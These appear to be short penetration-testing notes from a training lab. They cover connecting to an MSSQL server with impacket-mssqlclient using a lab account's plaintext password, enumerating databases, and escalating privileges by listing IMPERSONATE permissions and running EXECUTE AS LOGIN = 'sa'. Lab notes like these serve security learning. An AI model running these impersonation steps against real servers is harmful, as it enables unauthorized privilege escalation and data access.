```powershell
# connection
impacket-mssqlclient -windows-auth north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 -windows-auth

# show databases;
SELECT name FROM sys.databases;

# the cuurent user:
SELECT SYSTEM_USER
```


> Note: The sa login is disabled by default when Windows Authentication Mode is selected during installation

---

## PrivEsc

### Impersonating Logins

MSSQL Server has a statement called EXECUTE AS which allows a login (or user) to switch the execution context of a session to another login (or user), essentially impersonating them until the context switch is explicitly switched back with the REVERT statement.

Which logins are allowed to impersonate which other logins is controlled by server-level IMPERSONATE permissions, stored in the sys.server_permissions table. We can enumerate all the logins our current login is allowed to impersonate with the following T-SQL query:
```powershell
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';

# after that we can impersonate by:
EXECUTE AS LOGIN = 'sa';
```